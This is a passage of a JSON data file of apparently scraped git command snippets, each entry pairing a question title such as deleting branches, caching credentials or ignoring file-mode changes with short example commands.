    "description": "// Example for creating a new branch named myNewBranch git checkout -b myNewBranch  // First Push git push --set-upstream origin myNewBranch\n//Create a New Branch git checkout -b [name_of_your_new_branch] //First Push git push --set-upstream origin [name_of_your_new_branch]\n// create and checkout new branch in one line git checkout -b new_branch\n$ git checkout -b [name_of_your_new_branch]\ngit checkout -b <branch_name>\n// create and checkout new branch  git checkout -b new_branch\n",
    "reg_date": "2021-10-11T22:05:06.000Z"
  },
  {
    "id": 1771,
    "keyword": null,
    "link": null,
    "title": " git create new default branch",
    "description": "git branch -m master main # renames \"master\" to \"main\" git push -u origin main # push new branch\n",
    "reg_date": "2021-10-11T22:05:06.000Z"
  },
  {
    "id": 1772,
    "keyword": null,
    "link": null,
    "title": " git credential cache",
    "description": "# Set credential cache to avoid typing password every time # (Timeout time is in seconds i.e. 14 hours) # For Ubuntu  git config credential.helper 'cache --timeout=50400'\n# Set the time to remember your credentials for (in seconds). The command below sets it to 10 minutes. $ git config --global credential.helper 'cache --timeout=600'\n",
    "reg_date": "2021-10-11T22:05:06.000Z"
  },
  {
    "id": 1773,
    "keyword": null,
    "link": null,
    "title": " git credentials",
    "description": "// local git config credential.helper store // global git config --global credential.helper store\n# this will store your credentials \"forever\" git config --global credential.helper store\n# This cache timeout is in seconds $ git config --global credential.helper 'cache --timeout=3600'  \n",
    "reg_date": "2021-10-11T22:05:06.000Z"
  },
  {
    "id": 1774,
    "keyword": null,
    "link": null,
    "title": " git delete all branches except master",
    "description": "git branch | %{ $_.Trim() } | ?{ $_ -ne 'master' } | %{ git branch -D $_ }\ngit branch | grep -v \"master\" | xargs git branch -D\n$ git branch | grep -v '^*' | xargs git branch -D\n",
    "reg_date": "2021-10-11T22:05:07.000Z"
  },
  {
    "id": 1775,
    "keyword": null,
    "link": null,
    "title": " git delete all tags local and remote",
    "description": "git tag -d $(git tag -l) \ngit fetch git tag -l | xargs -n 1 git push --delete origin\n",
    "reg_date": "2021-10-11T22:05:07.000Z"
  },
  {
    "id": 1776,
    "keyword": null,
    "link": null,
    "title": " git delete branch",
    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName \n## git version 2.25.1  ## Deleting local branches git branch -d localBranchName ## Deleting remote branches git push origin --delete remoteBranchName  ## Deleting both a local and a remote branch ## They are completely separate objects in Git. But git branch -d localBranchName && git push origin --delete remoteBranchName\n## Deleting local branch; branch is not fully merged git branch -D feature/login\n$ git branch -d <branchname>\ngit push <remote> :<branch>\n",
    "reg_date": "2021-10-11T22:05:07.000Z"
  },
  {
    "id": 1777,
    "keyword": null,
    "link": null,
    "title": " git delete branches that aren't on remote",
    "description": "git branch -vv | grep ': gone]'|  grep -v \"\\*\" | awk '{ print $1; }' | xargs -r git branch -D\ngit fetch --all --prune\n",
    "reg_date": "2021-10-11T22:05:07.000Z"
  },
  {
    "id": 1778,
    "keyword": null,
    "link": null,
    "title": " git delete empty directory",
    "description": "git clean -fd\n",
    "reg_date": "2021-10-11T22:05:07.000Z"
  },
  {
    "id": 1779,
    "keyword": null,
    "link": null,
    "title": " git delete last commit after push",
    "description": "git reset --hard HEAD~1 git push -f <remote> <branch>\n",
    "reg_date": "2021-10-11T22:05:07.000Z"
  },
  {
    "id": 1780,
    "keyword": null,
    "link": null,
    "title": " git delete local branch",
    "description": "// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName \ngit branch -d test\n$ git push -d <remote_name> <branch_name> $ git branch -d <branch_name> \n$ git for-each-ref --format '%(refname:short) %(upstream:track)' |   awk '$2 == \"[gone]\" {print $1}' |   xargs -r git branch -D  Deleted branch fix-typo (was 7b57d4f). Deleted branch grammar-fix (was 01257bd). \n# HowTo delete multiple git branches on MAC / Linux / Unix environments  # git branch | grep \"<RegXpattern>\" | xargs git branch -D # here's an example to delete multiple branches that starts with \"branch\" git branch | grep \"branch*\" | xargs git branch -D\n[alias]   gone = ! \"git fetch -p && git for-each-ref --format '%(refname:short) %(upstream:track)' | awk '$2 == \\\"[gone]\\\" {print $1}' | xargs -r git branch -D\" \n",
    "reg_date": "2021-10-11T22:05:07.000Z"
  },
  {
    "id": 1781,
    "keyword": null,
    "link": null,
    "title": " git delete local branches not on remote",
    "description": "git branch -vv | grep ': gone]'|  grep -v \"\\*\" | awk '{ print $1; }' | xargs -r git branch -D\ngit fetch -p && for branch in $(git branch -vv | grep ': gone]' | awk '{print $1}'); do git branch -D $branch; done \ngit fetch --all --prune\n$ git branch -a  # *master # b1 # remote/origin/master # remote/origin/b1  $ git push origin --delete b1 # [...] # - [deleted] b1\n",
    "reg_date": "2021-10-11T22:05:07.000Z"
  },
  {
    "id": 1782,
    "keyword": null,
    "link": null,
    "title": " git delete local commit",
    "description": "git reset --hard origin/<branch_name> \ngit checkout master git reset --hard e3f1e37 git push --force origin master # Then to prove it (it won't print any diff) git diff master..origin/master\ngit reset --hard <hash-or-ref>\n# Remove ALL commits up to commit hash. # NB: Make sure these commits have not been pushed.  git reset --hard <commit hash number>\n",
    "reg_date": "2021-10-11T22:05:08.000Z"
  },
  {
    "id": 1783,
    "keyword": null,
    "link": null,
    "title": " git delete merged branches",
    "description": "git branch --merged | egrep -v \"(^\\*|master|dev)\" | xargs git branch -d \ngit branch --merged | grep -v '^* master$' | grep -v '^  master$' | xargs git branch -d \n",
    "reg_date": "2021-10-11T22:05:08.000Z"
  },
  {
    "id": 1784,
    "keyword": null,
    "link": null,
    "title": " git delete multiple branch local",
    "description": "// git remove multiple branch // here pattern refers to few characters of branch name that is common between multiple branches  // delete branch locally git branch | grep \"pattern\" | xargs git branch -d  // delete local branch that is unmerged git branch | grep \"pattern\" | xargs git branch -D\n",
    "reg_date": "2021-10-11T22:05:08.000Z"
  },
  {
    "id": 1785,
    "keyword": null,
    "link": null,
    "title": " git delete remote branch",
    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n$ git remote -v # View current remotes > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push) > destination  https://github.com/FORKER/REPOSITORY.git (fetch) > destination  https://github.com/FORKER/REPOSITORY.git (push)  $ git remote rm destination # Remove remote $ git remote -v # Verify it's gone > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push)\n$ git push origin --delete feature/login \n#delete remote branch git push -d <remote_name> <branch_name> #example: git push -d origin new_feature  #delete local branch git branch -d <branch_name> #example: git branch -d new_feature\n$ git push -d <remote_name> <branch_name> $ git branch -d <branch_name> \ngit push <remote> :<branch>\n",
    "reg_date": "2021-10-11T22:05:08.000Z"
  },
  {
    "id": 1786,
    "keyword": null,
    "link": null,
    "title": " git delete tag",
    "description": "# Add tags git tag tagName  # Push tags git push --follow-tags  # Delete locally git tag -d tagName  # Delete remote tag: git tag -d tagName git push origin :tagName\nDelete a remote Git tag  $ git push --delete origin tagname\ngit push --delete origin tagname\nLocal: git tag -d <tag_name> Remote: git push --delete origin tagname\ngit push --delete origin tagname \ngit push origin :tagname \n",
    "reg_date": "2021-10-11T22:05:08.000Z"
  },
  {
    "id": 1787,
    "keyword": null,
    "link": null,
    "title": " git delete tag name",
    "description": "git push --delete origin tagname\n",
    "reg_date": "2021-10-11T22:05:08.000Z"
  },
  {
    "id": 1788,
    "keyword": null,
    "link": null,
    "title": " git diff ignore spaces and tabs",
    "description": "git diff -w\n",
    "reg_date": "2021-10-11T22:05:08.000Z"
  },
  {
    "id": 1789,
    "keyword": null,
    "link": null,
    "title": " git discard local changes",
    "description": "# Discarding local changes (permanently) to a file: git checkout -- <file>  # Discard all local changes to all files permanently: git reset --hard\ngit fetch  # will fetch the latest changes on the remote git reset --hard origin/master # will set your local branch to match the representation of the remote just pulled down. \ngit checkout -- . \ngit checkout HEAD -- my-file.txt\ngit stash save --keep-index --include-untracked\ngit reset HEAD git checkout . \n",
    "reg_date": "2021-10-11T22:05:09.000Z"
  },
  {
    "id": 1790,
    "keyword": null,
    "link": null,
    "title": " git discard untracked",
    "description": "# if you want to clean directories as well add -d git clean -fd\ngit clean -fd\n",
    "reg_date": "2021-10-11T22:05:09.000Z"
  },
  {
    "id": 1791,
    "keyword": null,
    "link": null,
    "title": " git display unrelated histories",
    "description": "git pull origin branchname --allow-unrelated-histories\ngit merge upstream/master --allow-unrelated-histories \n",
    "reg_date": "2021-10-11T22:05:09.000Z"
  },
  {
    "id": 1792,
    "keyword": null,
    "link": null,
    "title": " git download specific commit",
    "description": "git reset --hard fbee9dd \n",
    "reg_date": "2021-10-11T22:05:09.000Z"
  },
  {
    "id": 1793,
    "keyword": null,
    "link": null,
    "title": " git echo remote origin",
    "description": "git remote show origin \n",
    "reg_date": "2021-10-11T22:05:09.000Z"
  },
  {
    "id": 1794,
    "keyword": null,
    "link": null,
    "title": " git effacer banch",
    "description": "git branch -d<branchname>\n",
    "reg_date": "2021-10-11T22:05:09.000Z"
  },
  {
    "id": 1795,
    "keyword": null,
    "link": null,
    "title": " git eliminar rama local",
    "description": "git branch -d nombre_rama  # Para forzar eliminaci&oacute;n de ramas no mergeadas: git branch -D nombre_rama  # Para eliminar una rama remota: git push origin :nombre_rama\n",
    "reg_date": "2021-10-11T22:05:09.000Z"
  },
  {
    "id": 1796,
    "keyword": null,
    "link": null,
    "title": " git error: More than one value for the key user.name:",
    "description": "$ sudo git config --global --unset user.name \"username\"\n",
    "reg_date": "2021-10-11T22:05:10.000Z"
  },
  {
    "id": 1797,
    "keyword": null,
    "link": null,
    "title": " git error: cannot lock ref 'refs/remotes/origin/master': unable to resolve reference 'refs/remotes/origin/master': reference broken",
    "description": "rm .git/refs/remotes/origin/master git fetch \n",
    "reg_date": "2021-10-11T22:05:10.000Z"
  },
  {
    "id": 1798,
    "keyword": null,
    "link": null,
    "title": " git error invalid path",
    "description": " git config core.protectNTFS false \n",
    "reg_date": "2021-10-11T22:05:10.000Z"
  },
  {
    "id": 1799,
    "keyword": null,
    "link": null,
    "title": " git error needs merge",
    "description": "git reset --merge \n",
    "reg_date": "2021-10-11T22:05:10.000Z"
  },
  {
    "id": 1800,
    "keyword": null,
    "link": null,
    "title": " git error push declined due to email privacy restrictions",
    "description": "Try unchecking the &ldquo;Block command line pushes that expose my email&rdquo; box in your email settings and then pushing again.\ngit config --global user.email {ID}+{username}@users.noreply.github.com\ngit commit --amend --reset-author\n",
    "reg_date": "2021-10-11T22:05:10.000Z"
  },
  {
    "id": 1801,
    "keyword": null,
    "link": null,
    "title": " git existing code to new repository",
    "description": "cd myapp git init git remote add origin https://github.com/myname/myapp.git git add . git commit -m \"Initial commit\" git push -u origin master\n",
    "reg_date": "2021-10-11T22:05:10.000Z"
  },
  {
    "id": 1802,
    "keyword": null,
    "link": null,
    "title": " git fetch all remote branch",
    "description": "# track all remote branches: git branch -r | grep -v '\\->' | while read remote; do git branch --track \"${remote#origin/}\" \"$remote\"; done # update all local copies of remote branches git fetch --all # update all local tracking branches git pull --all \n",
    "reg_date": "2021-10-11T22:05:10.000Z"
  },
  {
    "id": 1803,
    "keyword": null,
    "link": null,
    "title": " git fetch prune",
    "description": "git fetch --prune #is the best utility for cleaning outdated branches. It will connect to a shared remote repository remote and fetch all remote branch refs. It will then delete remote refs that are no longer in use on the remote repository\ngit config --global fetch.prune true\n",
    "reg_date": "2021-10-11T22:05:10.000Z"
  },
  {
    "id": 1804,
    "keyword": null,
    "link": null,
    "title": " git fetch specific branch",
    "description": "# track all remote branches: git branch -r | grep -v '\\->' | while read remote; do git branch --track \"${remote#origin/}\" \"$remote\"; done # update all local copies of remote branches git fetch --all # update all local tracking branches git pull --all \ngit fetch origin branch-name \ngit pull origin <branch> \ngit fetch <remote_rep> <remote_branch>:<local_branch>\n",
    "reg_date": "2021-10-11T22:05:11.000Z"
  },
  {
    "id": 1805,
    "keyword": null,
    "link": null,
    "title": " git fetch tags force",
    "description": "git fetch --tags --force\n",
    "reg_date": "2021-10-11T22:05:11.000Z"
  },
  {
    "id": 1806,
    "keyword": null,
    "link": null,
    "title": " git fetch upstream",
    "description": "## Add Original Repository git remote add upstream https://github.com/OriginalOwner/OriginalProject.git  ## Verify if Repository is added git remote -v  ## Fetch Updates from Original Repository git fetch upstream  ## Checkout to your master branch git checkout master  ## Get Updates from upstream repo git merge upstream/master  ## Push the commit over  git push origin master\nThese steps update the master branch.  1. Make sure you are on the appropriate branch. \tgit checkout master  2. Fetch content from upstream \tgit fetch upstream  3. Merge upstream with the appropriate local branch \tgit merge upstream/master      4. Get help on Resolve merge conflicts if these occur.  5. If you also maintain a GitHub repository, push changes to  \tGitHub&rsquo;s (origin) master branch \tgit push origin master\ngit fetch upstream  git checkout master  git merge upstream/master  git push origin\n$ git rebase upstream/master  $ git checkout master  $ git fetch upstream\n$ git remote -v # List the current remotes origin  https://github.com/user/repo.git (fetch) origin  https://github.com/user/repo.git (push)  $ git remote add upstream https://github.com/otheruser/repo.git # Set a new remote  $ git remote -v # Verify new remote origin    https://github.com/user/repo.git (fetch) origin    https://github.com/user/repo.git (push) upstream  https://github.com/otheruser/repo.git (fetch) upstream  https://github.com/otheruser/repo.git (push) \n",
    "reg_date": "2021-10-11T22:05:11.000Z"
  },
  {
    "id": 1807,
    "keyword": null,
    "link": null,
    "title": " git file history",
    "description": "git log --all --full-history -- \"**/thefile.*\" \ngit log --follow -p -- path-to-file\n",
    "reg_date": "2021-10-11T22:05:11.000Z"
  },
  {
    "id": 1808,
    "keyword": null,
    "link": null,
    "title": " git file line history",
    "description": "# history of line 120 of the file build.sbt git log -L120,+1:'build.sbt'\n",
    "reg_date": "2021-10-11T22:05:11.000Z"
  },
  {
    "id": 1809,
    "keyword": null,
    "link": null,
    "title": " git files changed between two commits",
    "description": "git diff --name-only SHA1 SHA2 \ngit diff mybranch master -- myfile.cs \n$ git diff HEAD^^ HEAD main.c $ # show diff between HEAD(current commit) and HEAD^^(two commits back) for main.c \ngit diff --name-only SHA1 SHA2\n",
    "reg_date": "2021-10-11T22:05:11.000Z"
  },
  {
    "id": 1810,
    "keyword": null,
    "link": null,
    "title": " git find login",
    "description": "git config user.name \n",
    "reg_date": "2021-10-11T22:05:11.000Z"
  },
  {
    "id": 1811,
    "keyword": null,
    "link": null,
    "title": " git find merge conflicts",
    "description": "git diff --name-only --diff-filter=U \ngit stash        -- > take my project to temp memory git pull         -- > pull the project from GitHub to working directory \t\t\t\t\t\t(my computer) git stash pop    -- > take my project to my working directory,      \t\t\t\t\tfix the conflict and merge the project. git add . git commit &ndash;m &ldquo;comment&rdquo; git push \n",
    "reg_date": "2021-10-11T22:05:12.000Z"
  },
  {
    "id": 1812,
    "keyword": null,
    "link": null,
    "title": " git find when file was deleted",
    "description": "git log --full-history -- your_file \nrm -rf deleted file, if there is any commit before use git commands: // 1 Find out which comit has the copy of deleted file git log          // 2 Use checkout to locate which comit what file location git checkout branch-number-here -- file/location/in/folder/without/quote example: git checkout 476c714 -- mvc/public/js/bundle.js  \n",
    "reg_date": "2021-10-11T22:05:12.000Z"
  },
  {
    "id": 1813,
    "keyword": null,
    "link": null,
    "title": " git first push",
    "description": "echo \"# my-pfe-informatique-mobile\" >> README.md git init git add README.md git commit -m \"first commit\" git branch -M main git remote add origin https://github.com/TaherSaid/my-pfe-informatique-mobile.git git push -u origin main\n# On server: mkdir my_project.git cd my_project.git git --bare init # On client: mkdir my_project cd my_project touch .gitignore git init git add . git commit -m \"Initial commit\" git remote add origin youruser@yourserver.com:/path/to/my_project.git git push origin master\n",
    "reg_date": "2021-10-11T22:05:12.000Z"
  },
  {
    "id": 1814,
    "keyword": null,
    "link": null,
    "title": " git flow init",
    "description": "#basic git flow init #with default to not be promted git flow init -d #with force to re-run init and edit data git flow init -f\n#Open a feature branch named: feature/feature_name git flow feature start feature_name #Close a feature branch git flow feature finish feature_name #Remember to push all branches git push --all\n#Starting a release create a branch release/release_version #tipically version are Semantic Versioning standard X.Y.Z git flow release start release_version #Finish a release, remember to update your application version! git flow release finish release_version #Remember to push all branches and tags git push --all --follow-tags\n$ git flow init  Initialized empty Git repository in ~/project/.git/ No branches exist yet. Base branches must be created now. Branch name for production releases: [master] Branch name for \"next release\" development: [develop] How to name your supporting branch prefixes? Feature branches? [feature/] Release branches? [release/] Hotfix branches? [hotfix/] Support branches? [support/] Version tag prefix? []  $ git branch  * develop  master\ngit flow release finish '0.1.0'\n",
    "reg_date": "2021-10-11T22:05:12.000Z"
  },
  {
    "id": 1815,
    "keyword": null,
    "link": null,
    "title": " git flush the repository credential in command line ubuntu",
    "description": "git config --unset credential.helper \n",
    "reg_date": "2021-10-11T22:05:12.000Z"
  },
  {
    "id": 1816,
    "keyword": null,
    "link": null,
    "title": " git force pull",
    "description": "git fetch --all git reset --hard origin/master\ngit reset --hard origin/master \n# WARNING: this can't be undone!  git reset --hard HEAD git clean -f -d git pull \ngit reset --hard HEAD git pull \n# if working with newer repos where 'master' is now 'main' git fetch --all git reset --hard origin/main \ngit push -f\n",
    "reg_date": "2021-10-11T22:05:12.000Z"
  },
  {
    "id": 1817,
    "keyword": null,
    "link": null,
    "title": " git from command line",
    "description": "git status git add . (for al your files) git add name to add just certain files git commit -m \"message\" git push\n",
    "reg_date": "2021-10-11T22:05:12.000Z"
  },
  {
    "id": 1818,
    "keyword": null,
    "link": null,
    "title": " git get a clone from a specific branch",
    "description": "git clone --branch <branchname> <remote-repo-url>\n",
    "reg_date": "2021-10-11T22:05:13.000Z"
  },
  {
    "id": 1819,
    "keyword": null,
    "link": null,
    "title": " git get address",
    "description": "git config --get remote.origin.url\n",
    "reg_date": "2021-10-11T22:05:13.000Z"
  },
  {
    "id": 1820,
    "keyword": null,
    "link": null,
    "title": " git get current commit",
    "description": "git rev-parse HEAD\n",
    "reg_date": "2021-10-11T22:05:13.000Z"
  },
  {
    "id": 1821,
    "keyword": null,
    "link": null,
    "title": " git get current commit hash",
    "description": "git rev-parse HEAD\n",
    "reg_date": "2021-10-11T22:05:13.000Z"
  },
  {
    "id": 1822,
    "keyword": null,
    "link": null,
    "title": " git get repository url",
    "description": " git config --get remote.origin.url\ngit config --get remote.origin.url\ngit remote show origin \nwithout network git config --get remote.origin.url  with network (detailed) git remote show origin\ngit remote -v git config --get remote.origin.url git remote show origin git config --get remote.origin.url\n",
    "reg_date": "2021-10-11T22:05:13.000Z"
  },
  {
    "id": 1823,
    "keyword": null,
    "link": null,
    "title": " git get upstream branch name",
    "description": "git remote show origin\n",
    "reg_date": "2021-10-11T22:05:13.000Z"
  },
  {
    "id": 1824,
    "keyword": null,
    "link": null,
    "title": " git global gitignore",
    "description": "#Create your global ignore file like a normal .gitignore #in your home folder. git config --global core.excludesfile /path/to/home/.gitignore #Your git now exclude any file declared in that .gitignore #It's useful for hide your IDE's folder (.idea, .vscode, ...)\ntouch ~/.gitignore git config --global core.excludesfile ~/.gitignore\n# .gitignore global # IntelliJ IDEA .idea *.iml *.iws .idea-compl *.sc  # Mac .DS_Store  # Clojure .lein-repl-history .lein-failures completer.hist .nrepl-port  # Scala libsigar-universal64-macosx.dylib  # Custom *.no-commit.* \n",
    "reg_date": "2021-10-11T22:05:13.000Z"
  },
  {
    "id": 1825,
    "keyword": null,
    "link": null,
    "title": " git global ignore",
    "description": "#Create your global ignore file like a normal .gitignore #in your home folder. git config --global core.excludesfile /path/to/home/.gitignore #Your git now exclude any file declared in that .gitignore #It's useful for hide your IDE's folder (.idea, .vscode, ...)\ntouch ~/.gitignore git config --global core.excludesfile ~/.gitignore\ntouch ~/.gitignore git config --global core.excludesfile ~./gitignore\n# .gitignore global # IntelliJ IDEA .idea *.iml *.iws .idea-compl *.sc  # Mac .DS_Store  # Clojure .lein-repl-history .lein-failures completer.hist .nrepl-port  # Scala libsigar-universal64-macosx.dylib  # Custom *.no-commit.* \n",
    "reg_date": "2021-10-11T22:05:13.000Z"
  },
  {
    "id": 1826,
    "keyword": null,
    "link": null,
    "title": " git graph",
    "description": "git log --all --decorate --oneline --graph \ngit config --global alias.adog \"log --all --decorate --oneline --graph\" # after just git adog # Problem? -> linkedin.com/in/barisx\ngit log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset) %C(bold cyan)(committed: %cD)%C(reset) %C(auto)%d%C(reset)%n''          %C(white)%s%C(reset)%n''          %C(dim white)- %an <%ae> %C(reset) %C(dim white)(committer: %cn <%ce>)%C(reset)' # Problem? -> linkedin.com/in/barisx\n[alias]     lg = lg1     lg1 = lg1-specific --all     lg2 = lg2-specific --all     lg3 = lg3-specific --all      lg1-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(auto)%d%C(reset)'     lg2-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset)%C(auto)%d%C(reset)%n''          %C(white)%s%C(reset) %C(dim white)- %an%C(reset)'     lg3-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset) %C(bold cyan)(committed: %cD)%C(reset) %C(auto)%d%C(reset)%n''          %C(white)%s%C(reset)%n''          %C(dim white)- %an <%ae> %C(reset) %C(dim white)(committer: %cn <%ce>)%C(reset)' \n",
    "reg_date": "2021-10-11T22:05:14.000Z"
  },
  {
    "id": 1827,
    "keyword": null,
    "link": null,
    "title": " git graph code",
    "description": "git log --all --decorate --oneline --graph \ngit config --global alias.adog \"log --all --decorate --oneline --graph\" # after just git adog # Problem? -> linkedin.com/in/barisx\ngit log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset) %C(bold cyan)(committed: %cD)%C(reset) %C(auto)%d%C(reset)%n''          %C(white)%s%C(reset)%n''          %C(dim white)- %an <%ae> %C(reset) %C(dim white)(committer: %cn <%ce>)%C(reset)' # Problem? -> linkedin.com/in/barisx\n[alias]     lg = lg1     lg1 = lg1-specific --all     lg2 = lg2-specific --all     lg3 = lg3-specific --all      lg1-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(auto)%d%C(reset)'     lg2-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset)%C(auto)%d%C(reset)%n''          %C(white)%s%C(reset) %C(dim white)- %an%C(reset)'     lg3-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset) %C(bold cyan)(committed: %cD)%C(reset) %C(auto)%d%C(reset)%n''          %C(white)%s%C(reset)%n''          %C(dim white)- %an <%ae> %C(reset) %C(dim white)(committer: %cn <%ce>)%C(reset)' \n",
    "reg_date": "2021-10-11T22:05:14.000Z"
  },
  {
    "id": 1828,
    "keyword": null,
    "link": null,
    "title": " git grep across all branches",
    "description": "git grep \"string/regexp\" $(git rev-list --all)\n",
    "reg_date": "2021-10-11T22:05:14.000Z"
  },
  {
    "id": 1829,
    "keyword": null,
    "link": null,
    "title": " git hard reset to commit id",
    "description": " git reset --hard <commit-hash>  git push -f origin master\ngit reset --hard id git push --force\n",
    "reg_date": "2021-10-11T22:05:14.000Z"
  },
  {
    "id": 1830,
    "keyword": null,
    "link": null,
    "title": " git host key verification failed",
    "description": "#Windows: ssh-keyscan -t rsa github.com >> %userprofile%/.ssh/known_hosts  #Mac: ssh-keyscan -t rsa github.com >> ~/.ssh/known_hosts  # (If it says 'Command not found', try to run the command in your Git Bash.)\n",
    "reg_date": "2021-10-11T22:05:14.000Z"
  },
  {
    "id": 1831,
    "keyword": null,
    "link": null,
    "title": " git how to commit changes to another branch",
    "description": "git stash git checkout other-branch git stash pop \n",
    "reg_date": "2021-10-11T22:05:14.000Z"
  },
  {
    "id": 1832,
    "keyword": null,
    "link": null,
    "title": " git how to delete origin branch",
    "description": "$ git push origin --delete feature/login \ngit push -d origin <branch_name>\n",
    "reg_date": "2021-10-11T22:05:14.000Z"
  },
  {
    "id": 1833,
    "keyword": null,
    "link": null,
    "title": " git how to not remove a file with git clean",
    "description": "//Remove untracked files git clean -f  //Remove untracked directories and files git clean -fd  //Remove untracked ignored files git clean -fX  //Remove all untracked files  git clean -fx\n",
    "reg_date": "2021-10-11T22:05:14.000Z"
  },
  {
    "id": 1834,
    "keyword": null,
    "link": null,
    "title": " git how to remove git",
    "description": "git rm -r --cached .\n$ git rm --cached filename\n",
    "reg_date": "2021-10-11T22:05:15.000Z"
  },
  {
    "id": 1835,
    "keyword": null,
    "link": null,
    "title": " git ignore .idea folder",
    "description": "Git never ignores changes to tracked files. As it appears as modified, the file  is under version control (the idea/workspace.xml file usually should not be)  and thus changes to it are tracked. Delete it from the index, leaving your  local copy intact with  git rm --cached .idea/workspace.xml   and commit this change. From then on it will be ignored unless you force-add it  back to the repository or change your gitignore settings.  # Remove the file from the repository git rm --cached .idea/  # now update your gitignore file to ignore this folder .idea/  # add the .gitignore file git add .gitignore  git commit -m \"Removed .idea files\" git push origin <branch>\n.idea/\n",
    "reg_date": "2021-10-11T22:05:15.000Z"
  },
  {
    "id": 1836,
    "keyword": null,
    "link": null,
    "title": " git ignore all ds store",
    "description": "echo \".DS_Store\" >> ~/.gitignore_global echo \"._.DS_Store\" >> ~/.gitignore_global echo \"**/.DS_Store\" >> ~/.gitignore_global echo \"**/._.DS_Store\" >> ~/.gitignore_global git config --global core.excludesfile ~/.gitignore_global \nfind . -name .DS_Store -print0 | xargs -0 git rm -f --ignore-unmatch  git add .gitignore git commit -m '.DS_Store banished!'\n",
    "reg_date": "2021-10-11T22:05:15.000Z"
  },
  {
    "id": 1837,
    "keyword": null,
    "link": null,
    "title": " git ignore chmod",
    "description": "git config core.fileMode false \n",
    "reg_date": "2021-10-11T22:05:15.000Z"
  },
  {
    "id": 1838,
    "keyword": null,
    "link": null,
    "title": " git ignore file mode changes",
    "description": "git config core.fileMode false \n",
    "reg_date": "2021-10-11T22:05:15.000Z"
  },
  {
    "id": 1839,
    "keyword": null,
    "link": null,
    "title": " git ignore files modified by permission",
    "description": "git config core.fileMode false \n",
    "reg_date": "2021-10-11T22:05:15.000Z"
  },
  {
    "id": 1840,
    "keyword": null,
    "link": null,
    "title": " git ignore mode",
    "description": "git config core.fileMode false \n# https://gist.github.com/icoxfog417/ebaaac8779dc235d176e git config core.fileMode false \n",
    "reg_date": "2021-10-11T22:05:15.000Z"
  },
  {
    "id": 1841,
    "keyword": null,
    "link": null,
    "title": " git ignore mode chmod",
    "description": "git config core.fileMode false \n",
    "reg_date": "2021-10-11T22:05:16.000Z"
  },
  {
    "id": 1842,
    "keyword": null,
    "link": null,
    "title": " git ignore not working",
    "description": "git rm -r --cached . git add . git commit -m \"fixed untracked files\"\ngit rm -r --cached .; git add .; git commit -m \"Untracked files issue resolved to fix .gitignore\"; \ngit rm -r --cached . git add . git commit -m &ldquo;.gitignore is now working&rdquo;\n# Remember to commit everything you've changed before you do this! git rm -rf --cached . git add .  # This removes all files from the repository and adds them back # (this time respecting the rules in your .gitignore).  # Source: https://stackoverflow.com/a/25436481\n# First save your changes to a branch on the remote repo # If you don't have changes skip these three git add . git commit -m \"commit message\" git push origin [branchname] # Then remove all cached files git rm -r --cached . # Add all the files back in  git add . # The files you added to the .gitignore should now be greyed out in # the file explorer window if you're using vscode\n- Copy file to ignore in other location - Push a commit with deleted file - Copy back the deleted file\n",
    "reg_date": "2021-10-11T22:05:16.000Z"
  },
  {
    "id": 1843,
    "keyword": null,
    "link": null,
    "title": " git ignore ownership changes",
    "description": "git config core.fileMode false \ngit config core.fileMode false  core.fileMode     Tells Git if the executable bit of files in the working tree     is to be honored.      Some filesystems lose the executable bit when a file that is     marked as executable is checked out, or checks out a     non-executable file with executable bit on. git-clone(1)     or git-init(1) probe the filesystem to see if it handles the      executable bit correctly and this variable is automatically     set as necessary.      A repository, however, may be on a filesystem that handles     the filemode correctly, and this variable is set to true when     created, but later may be made accessible from another     environment that loses the filemode (e.g. exporting ext4     via CIFS mount, visiting a Cygwin created repository with Git     for Windows or Eclipse). In such a case it may be necessary     to set this variable to false. See git-update-index(1).      The default is true (when core.filemode is not specified     in the config file).\ngit config core.fileMode false\n",
    "reg_date": "2021-10-11T22:05:16.000Z"
  },
  {
    "id": 1844,
    "keyword": null,
    "link": null,
    "title": " git ignore permission changes",
    "description": "git config core.fileMode false \n# local project git config core.fileMode false  # global user homespace git config --global core.fileMode false\n",
    "reg_date": "2021-10-11T22:05:16.000Z"
  },
  {
    "id": 1845,
    "keyword": null,
    "link": null,
    "title": " git ignore permission mode",
    "description": "git config core.fileMode false \n",
    "reg_date": "2021-10-11T22:05:16.000Z"
  },
  {
    "id": 1846,
    "keyword": null,
    "link": null,
    "title": " git ignore remove",
    "description": "git rm -r --cached . git add . git commit -m \"Removing all files in .gitignore\" \ngit ls-files --ignored --exclude-standard -z | xargs -0 git rm --cached git commit -am \"Remove ignored files\"   // answer from: thSoft\n",
    "reg_date": "2021-10-11T22:05:16.000Z"
  },
  {
    "id": 1847,
    "keyword": null,
    "link": null,
    "title": " git ignore still tracking",
    "description": "git rm --cached <file>  git rm -r --cached <folder>\n",
